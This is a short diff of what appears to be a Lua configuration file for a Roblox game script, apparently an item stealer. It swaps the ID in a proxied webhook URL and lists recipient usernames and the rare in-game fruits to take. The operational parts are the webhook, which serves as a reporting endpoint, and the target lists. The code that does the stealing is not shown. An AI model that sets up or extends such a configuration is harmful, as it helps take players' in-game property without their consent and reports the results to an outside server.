@@ -1,4 +1,4 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=RlBLMjV2SlZBbFl0TlFmVXdZUlMtdzo5U2tnLXJxSkh3WmRmLUg1XzdoWkdFREZ1eU14bExqMW1icEdmdTVCUWhtSzY0eDNBT2pJVnNidVlMMWdDclg1dk1mcDRxRVc4QjBtdGQ4anprMGZmTTBraEdfUXZDWk5YMHdWTGJ2SEZfMS1zSEpMd2FGeXVacDdNeFgtN21ybkFpdXVwOU9tZ1haVUxRZTc5OHdxV2h5UnBnTWV1eUxoMDBhVzUyOUZLcFk" 
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=c0FMVG1TOTk4dXdqanBPRS1CLW5uQTpYTmNTOWUwLVBrdHZVSGtZdERHY3JPS05hZjZGZWowQklaSlpIbXVpT3BWUWxvWVlHbGxlUWNOVVRfVHR4eVB3SXFpQmpkZlRvRG9vdVhXeURLT05WT0pMRklzS2VTLVVpNWVJUWRCRXJOai1UVTdUS3VHWmdRcENMWWhkWGV4b2I2dXk3Q29vVVBaUjFQNERxbmpSUjQ2TlY2ZWtsVnlabUlaTHd2em5lWWc" 
 Usernames = {"mfzgnr", "tarronfj","fritzowjr"}
 FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas"}
 
